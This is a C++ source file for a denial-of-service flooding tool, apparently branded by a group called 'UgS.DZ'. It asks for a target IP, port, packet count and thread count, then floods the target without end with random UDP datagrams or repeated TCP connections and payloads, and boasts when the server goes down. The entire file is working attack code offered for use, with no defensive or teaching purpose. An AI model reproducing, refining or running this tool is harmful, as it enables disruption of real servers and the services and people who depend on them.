// ugc is a back
#include <iostream>
#include <thread>
#include <vector>
#include <string>
#include <random>
#include <chrono>
#include <cstring>
#include <csignal>

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #pragma comment(lib, "ws2_32.lib")
    #define close closesocket
#else
    #include <unistd.h>
    #include <arpa/inet.h>
    #include <sys/socket.h>
    #include <netinet/in.h>
#endif

std::string ip;
int port;
int packets;
int threads_count;
bool udp_mode = true;

void udp_attack() {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return;

    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &target.sin_addr);

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dist(0, 2);
    const char* symbols[] = {"[-]", "[•]", "[×]"};

    std::vector<char> payload(20000);
    std::generate(payload.begin(), payload.end(), [&]() { return static_cast<char>(rd()); });

    while (true) {
        for (int i = 0; i < packets; ++i) {
            sendto(sock, payload.data(), payload.size(), 0, (struct sockaddr*)&target, sizeof(target));
        }
        std::cout << "\033[92m" << symbols[dist(gen)] << " TEAM UgS.DZ $$$$ → " << ip << ":" << port << "\033[0m\n";
    }
    close(sock);
}

void tcp_attack() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dist(0, 2);
    const char* symbols[] = {"[-]", "[+]", "[x]"};

    std::vector<char> payload(5000);
    std::generate(payload.begin(), payload.end(), [&]() { return static_cast<char>(rd()); });

    while (true) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;

        struct sockaddr_in target;
        target.sin_family = AF_INET;
        target.sin_port = htons(port);
        inet_pton(AF_INET, ip.c_str(), &target.sin_addr);

        if (connect(sock, (struct sockaddr*)&target, sizeof(target)) == 0) {
            send(sock, payload.data(), payload.size(), 0);
            for (int i = 0; i < packets; ++i) {
                send(sock, payload.data(), payload.size(), 0);
            }
            std::cout << "\033[92m" << symbols[dist(gen)] << " TEAM UgS.DZ TA9TA7EM! → " << ip << ":" << port << "\033[0m\n";
        } else {
            std::cout << "\033[91m[!] SERVER IS DOWN BY UgS.DZ !!!\033[0m\n";
        }
        close(sock);
    }
}

int main() {
    system("clear || cls");
    std::cout << "\033[91m";
    std::cout << R"(
  _   _        ____   ____ _____
| | | | __ _ / ___| |  _ \__  /
| | | |/ _` | |     | | | |/ / 
| |_| | (_| | |___ _| |_| / /_ 
 \___/ \__, |\____(_)____/____|
       |___/  
        UgS.DZ 2025 - C++ POWER
    )" << "\033[0m\n";

    std::string pass;
    std::cout << "\033[93mكلمة المرور UgS.DZ: \033[0m";
    std::cin >> pass;
    if (pass != "user" && pass != "ugc" && pass != "UGC" && pass != "User") {
        std::cout << "\033[91mPASSWORD NOT FUND\033[0m\n";
        return 0;
    }

    std::cout << "\033[93mServer IP   : \033[0m"; std::cin >> ip;
    std::cout << "\033[93mPort        : \033[0m"; std::cin >> port;
    
    char choice;
    std::cout << "\033[93mDDoS Attack? (y/n): \033[0m"; std::cin >> choice;
    udp_mode = (choice == 'y' || choice == 'Y');

    std::cout << "\033[93mPackets     : \033[0m"; std::cin >> packets;
    std::cout << "\033[93mThreads     : \033[0m"; std::cin >> threads_count;

#ifdef _WIN32
    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);
#endif

    std::vector<std::thread> threads;
    for (int i = 0; i < threads_count; ++i) {
        if (udp_mode)
            threads.emplace_back(udp_attack);
        else
            threads.emplace_back(tcp_attack);
    }

    for (auto& t : threads) t.join();

    return 0;
}